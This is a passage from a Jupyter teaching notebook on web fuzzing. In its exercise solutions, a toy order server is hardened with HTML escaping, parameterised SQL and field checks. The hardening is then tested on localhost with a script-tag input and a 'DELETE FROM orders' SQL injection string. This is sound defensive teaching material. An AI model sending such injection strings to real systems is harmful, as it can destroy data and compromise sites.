   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We define a better message that does not reveal tracebacks:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 172,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.819601Z",
     "iopub.status.busy": "2021-11-01T22:34:05.818983Z",
     "iopub.status.idle": "2021-11-01T22:34:05.821131Z",
     "shell.execute_reply": "2021-11-01T22:34:05.821572Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "BETTER_HTML_INTERNAL_SERVER_ERROR = \\\n",
    "    HTML_INTERNAL_SERVER_ERROR.replace(\"<pre>{error_message}</pre>\", \"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 173,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.825093Z",
     "iopub.status.busy": "2021-11-01T22:34:05.824280Z",
     "iopub.status.idle": "2021-11-01T22:34:05.827172Z",
     "shell.execute_reply": "2021-11-01T22:34:05.827539Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  \n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 173,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(BETTER_HTML_INTERNAL_SERVER_ERROR)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We have the `internal_server_error()` message return `HTTPStatus.OK` to make it harder for machines to find out something went wrong:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 174,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.832708Z",
     "iopub.status.busy": "2021-11-01T22:34:05.831882Z",
     "iopub.status.idle": "2021-11-01T22:34:05.834033Z",
     "shell.execute_reply": "2021-11-01T22:34:05.834415Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def internal_server_error(self):\n",
    "        # Note: No INTERNAL_SERVER_ERROR status\n",
    "        self.send_response(HTTPStatus.OK, \"Internal Error\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        exc = traceback.format_exc()\n",
    "        self.log_message(\"%s\", exc.strip())\n",
    "\n",
    "        # No traceback or other information\n",
    "        message = BETTER_HTML_INTERNAL_SERVER_ERROR\n",
    "        self.wfile.write(message.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Part 2: Sanitized HTML\n",
    "\n",
    "Set up the server such that it is not vulnerable against HTML and JavaScript injection attacks, notably by using methods such as `html.escape()` to escape special characters when showing them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.837856Z",
     "iopub.status.busy": "2021-11-01T22:34:05.837306Z",
     "iopub.status.idle": "2021-11-01T22:34:05.839354Z",
     "shell.execute_reply": "2021-11-01T22:34:05.839789Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "outputs": [],
   "source": [
    "import html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We pass all values read through `html.escape()` before showing them on the screen; this will properly encode `<`, `&`, and `>` characters."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.844457Z",
     "iopub.status.busy": "2021-11-01T22:34:05.843924Z",
     "iopub.status.idle": "2021-11-01T22:34:05.845595Z",
     "shell.execute_reply": "2021-11-01T22:34:05.845964Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(BetterHTTPRequestHandler):\n",
    "    def send_order_received(self, values):\n",
    "        sanitized_values = {}\n",
    "        for field in values:\n",
    "            sanitized_values[field] = html.escape(values[field])\n",
    "        sanitized_values[\"item_name\"] = html.escape(\n",
    "            FUZZINGBOOK_SWAG[values[\"item\"]])\n",
    "\n",
    "        confirmation = HTML_ORDER_RECEIVED.format(\n",
    "            **sanitized_values).encode(\"utf8\")\n",
    "\n",
    "        self.send_response(HTTPStatus.OK, \"Order received\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(confirmation)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 3: Sanitized SQL\n",
    "\n",
    "Set up the server such that it is not vulnerable against SQL injection attacks, notably by using _SQL parameter substitution._"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We use SQL parameter substitution to avoid interpretation of inputs as SQL commands.  Also, we use `execute()` rather than `executescript()` to avoid processing of multiple commands."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 177,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.851474Z",
     "iopub.status.busy": "2021-11-01T22:34:05.850698Z",
     "iopub.status.idle": "2021-11-01T22:34:05.852906Z",
     "shell.execute_reply": "2021-11-01T22:34:05.853430Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(BetterHTTPRequestHandler):\n",
    "    def store_order(self, values):\n",
    "        db = sqlite3.connect(ORDERS_DB)\n",
    "        db.execute(\"INSERT INTO orders VALUES (?, ?, ?, ?, ?)\",\n",
    "                (values['item'], values['name'], values['email'], values['city'], values['zip']))\n",
    "        db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "One could also argue not to save \"dangerous\" characters in the first place.  But then, there might always be names or addresses with special characters which all need to be handled."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 4: A Robust Server\n",
    "\n",
    "Set up the server such that it does not crash with invalid or missing fields."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** We set up a simple check at the beginning of `handle_order()` that checks whether all required fields are present.  If not, we return to the order form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 178,
   "metadata": {
    "cell_style": "split",
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.858295Z",
     "iopub.status.busy": "2021-11-01T22:34:05.857749Z",
     "iopub.status.idle": "2021-11-01T22:34:05.859530Z",
     "shell.execute_reply": "2021-11-01T22:34:05.859898Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "class BetterHTTPRequestHandler(BetterHTTPRequestHandler):\n",
    "    REQUIRED_FIELDS = ['item', 'name', 'email', 'city', 'zip']\n",
    "\n",
    "    def handle_order(self):\n",
    "        values = self.get_field_values()\n",
    "        for required_field in self.REQUIRED_FIELDS:\n",
    "            if required_field not in values:\n",
    "                self.send_order_form()\n",
    "                return\n",
    "\n",
    "        self.store_order(values)\n",
    "        self.send_order_received(values)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "This could easily be extended to check for valid (at least non-empty) values.  Also, the order form should be pre-filled with the originally submitted values, and come with a helpful error message."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "#### Part 5: Test it!\n",
    "\n",
    "Test your improved server whether your measures have been successful."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "**Solution.**  Here we go:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.863438Z",
     "iopub.status.busy": "2021-11-01T22:34:05.862850Z",
     "iopub.status.idle": "2021-11-01T22:34:05.879798Z",
     "shell.execute_reply": "2021-11-01T22:34:05.880418Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "httpd_process, httpd_url = start_httpd(BetterHTTPRequestHandler)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 180,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.888050Z",
     "iopub.status.busy": "2021-11-01T22:34:05.887345Z",
     "iopub.status.idle": "2021-11-01T22:34:05.889961Z",
     "shell.execute_reply": "2021-11-01T22:34:05.890337Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800\">http://127.0.0.1:8800</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "print_url(httpd_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 181,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.894068Z",
     "iopub.status.busy": "2021-11-01T22:34:05.893501Z",
     "iopub.status.idle": "2021-11-01T22:34:05.895288Z",
     "shell.execute_reply": "2021-11-01T22:34:05.895722Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "print_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test standard behavior:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 182,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.901449Z",
     "iopub.status.busy": "2021-11-01T22:34:05.900388Z",
     "iopub.status.idle": "2021-11-01T22:34:05.919426Z",
     "shell.execute_reply": "2021-11-01T22:34:05.920115Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:05] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 182,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "standard_order = \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\"\n",
    "contents = webbrowser(httpd_url + standard_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 183,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.924350Z",
     "iopub.status.busy": "2021-11-01T22:34:05.923617Z",
     "iopub.status.idle": "2021-11-01T22:34:05.925393Z",
     "shell.execute_reply": "2021-11-01T22:34:05.925768Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"Thank you\") > 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test for incomplete URLs:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 184,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.929397Z",
     "iopub.status.busy": "2021-11-01T22:34:05.928774Z",
     "iopub.status.idle": "2021-11-01T22:34:05.938481Z",
     "shell.execute_reply": "2021-11-01T22:34:05.938878Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:05] \"GET /order?item= HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
       "  <p>\n",
       "  Yes! Please send me at your earliest convenience\n",
       "  <select name=\"item\">\n",
       "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
       "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
       "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
       "\n",
       "  </select>\n",
       "  <br>\n",
       "  <table>\n",
       "  <tr><td>\n",
       "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
       "  </td><td>\n",
       "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
       "  </td></tr>\n",
       "  <tr><td>\n",
       "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
       "  </td><td>\n",
       "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
       "  </tr></tr>\n",
       "  </table>\n",
       "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
       "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
       "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
       "</p>\n",
       "</form>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 184,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bad_order = \"/order?item=\"\n",
    "contents = webbrowser(httpd_url + bad_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 185,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.942373Z",
     "iopub.status.busy": "2021-11-01T22:34:05.941830Z",
     "iopub.status.idle": "2021-11-01T22:34:05.943688Z",
     "shell.execute_reply": "2021-11-01T22:34:05.944060Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"Order Form\") > 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test for HTML (and JavaScript) injection:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 186,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.948090Z",
     "iopub.status.busy": "2021-11-01T22:34:05.947312Z",
     "iopub.status.idle": "2021-11-01T22:34:05.958130Z",
     "shell.execute_reply": "2021-11-01T22:34:05.958510Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:05] \"GET /order?item=tshirt&name=Jane+Doe%3Cscript%3E%3C%2Fscript%3E&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe&lt;script&gt;&lt;/script&gt; in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 186,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "injection_order = \"/order?item=tshirt&name=Jane+Doe\" + cgi_encode(\"<script></script>\") + \\\n",
    "    \"&email=doe%40example.com&city=Seattle&zip=98104\"\n",
    "contents = webbrowser(httpd_url + injection_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 187,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.962338Z",
     "iopub.status.busy": "2021-11-01T22:34:05.961625Z",
     "iopub.status.idle": "2021-11-01T22:34:05.964184Z",
     "shell.execute_reply": "2021-11-01T22:34:05.964831Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"Thank you\") > 0\n",
    "assert contents.find(\"<script>\") < 0\n",
    "assert contents.find(\"&lt;script&gt;\") > 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "We test for SQL injection:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 188,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.970357Z",
     "iopub.status.busy": "2021-11-01T22:34:05.969455Z",
     "iopub.status.idle": "2021-11-01T22:34:05.982034Z",
     "shell.execute_reply": "2021-11-01T22:34:05.982716Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:05] \"GET /order?item=tshirt&name=Robert',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Robert&#x27;, &#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;); DELETE FROM orders; -- in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 188,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_order = \"/order?item=tshirt&name=\" + \\\n",
    "    cgi_encode(\"Robert', 'x', 'x', 'x'); DELETE FROM orders; --\") + \\\n",
    "    \"&email=doe%40example.com&city=Seattle&zip=98104\"\n",
    "contents = webbrowser(httpd_url + sql_order)\n",
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "(Okay, so obviously we can now handle the weirdest of names; still, Robert should consider changing his name...)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 189,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.987289Z",
     "iopub.status.busy": "2021-11-01T22:34:05.986728Z",
     "iopub.status.idle": "2021-11-01T22:34:05.989221Z",
     "shell.execute_reply": "2021-11-01T22:34:05.989707Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "assert contents.find(\"DELETE FROM\") > 0\n",
    "assert not orders_db_is_empty()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "source": [
    "That's it – we're done!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 190,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:05.993925Z",
     "iopub.status.busy": "2021-11-01T22:34:05.993167Z",
     "iopub.status.idle": "2021-11-01T22:34:05.995051Z",
     "shell.execute_reply": "2021-11-01T22:34:05.995601Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "httpd_process.terminate()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 191,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:06.000279Z",
     "iopub.status.busy": "2021-11-01T22:34:05.999505Z",
     "iopub.status.idle": "2021-11-01T22:34:06.002987Z",
     "shell.execute_reply": "2021-11-01T22:34:06.002006Z"
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution2": "hidden"
   },
   "outputs": [],
   "source": [
    "if os.path.exists(ORDERS_DB):\n",
    "    os.remove(ORDERS_DB)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution": "hidden",
    "solution2": "hidden",
    "solution2_first": true,
    "solution_first": true
   },
   "source": [
    "### Exercise 2: Protect the Server\n",
    "\n",
    "Assume that it is not possible for you to alter the server code.  Create a _filter_ that is run on all URLs before they are passed to the server."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution": "hidden",
    "solution2": "hidden",
    "solution2_first": true,
    "solution_first": true
   },
   "source": [
    "#### Part 1: A Blacklisting Filter\n",
    "\n",
    "Set up a filter function `blacklist(url)` that returns `False` for URLs that should not reach the server.  Check the URL for whether it contains HTML, JavaScript, or SQL fragments."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution": "hidden",
    "solution2": "hidden",
    "solution2_first": true,
    "solution_first": true
   },
   "source": [
    "#### Part 2: A Whitelisting Filter\n",
    "\n",
    "Set up a filter function `whitelist(url)` that returns `True` for URLs that are allowed to reach the server.  Check the URL for whether it conforms to expectations; use a [parser](Parser.ipynb) and a dedicated grammar for this purpose."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution": "hidden",
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** Left to the reader."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "### Exercise 3: Input Patterns\n",
    "\n",
    "To fill out forms, fuzzers could be much smarter in how they generate input values.  Starting with HTML 5, input fields can have a `pattern` attribute defining a _regular expression_ that an input value has to satisfy.  A 5-digit ZIP code, for instance, could be defined by the pattern\n",
    "\n",
    "```html\n",
    "<input type=\"text\" pattern=\"[0-9][0-9][0-9][0-9][0-9]\">\n",
    "```\n",
    "\n",
    "Extract such patterns from the HTML page and convert them into equivalent grammar production rules, ensuring that only inputs satisfying the patterns are produced."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution": "hidden",
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** Left to the reader at this point."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    },
    "solution2": "hidden",
    "solution2_first": true
   },
   "source": [
    "### Exercise 4: Coverage-Driven Web Fuzzing\n",
    "\n",
    "Combine the above fuzzers with [coverage-driven](GrammarCoverageFuzzer.ipynb) and [search-based](SearchBasedFuzzer.ipynb) approaches to maximize feature and code coverage."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    },
    "solution": "hidden",
    "solution2": "hidden"
   },
   "source": [
    "**Solution.** Left to the reader at this point."
   ]
  }
 ],
 "metadata": {
  "ipub": {
   "bibliography": "fuzzingbook.bib",
   "toc": true
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": true
  },
  "toc-autonumbering": false,
  "toc-showmarkdowntxt": false
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
